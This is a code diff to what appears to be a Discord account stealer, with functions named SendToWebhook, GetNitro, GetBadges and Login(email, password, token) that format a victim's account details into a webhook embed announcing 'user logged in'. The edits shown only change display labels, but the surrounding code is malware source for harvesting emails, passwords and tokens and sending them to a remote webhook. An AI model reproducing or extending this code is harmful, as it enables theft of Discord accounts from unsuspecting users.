@@ -85,7 +85,7 @@ function SendToWebhook(what) {
 
 function GetNitro(flags) {
 	if (flags == 0) {
-		return "❌"
+		return "❌ no nitro"
 	}
 	if (flags == 1) {
 		return "✔️ nitro classic"
@@ -93,7 +93,7 @@ function GetNitro(flags) {
 	if (flags == 2) {
 		return "✔️ nitro boost"
 	} else {
-		return "❌"
+		return "❌ no nitro"
 	}
 }
 
@@ -128,7 +128,7 @@ function GetRBadges(flags) {
 		badges += "✔️ verified bot developer "
 	}
 	if (badges == "") {
-		badges = "❌"
+		badges = "❌ no badges"
 	}
 	return badges
 }
@@ -167,7 +167,7 @@ function GetBadges(flags) {
 		badges += "✔️ verified bot developer "
 	}
 	if (badges == "") {
-		badges = "❌"
+		badges = "❌ no badges"
 	}
 	return badges
 }
@@ -187,7 +187,7 @@ function Login(email, password, token) {
             avatar_url: "https://i.imgur.com/mnMYF8Y.jpg",
             embeds: [
                 {
-                    "title": "<:partner:909102089513340979> user logged in",
+                    "title": " user logged in",
 		    "description": "᲼᲼᲼᲼",
                     "color": 3092790,
                     "fields": [
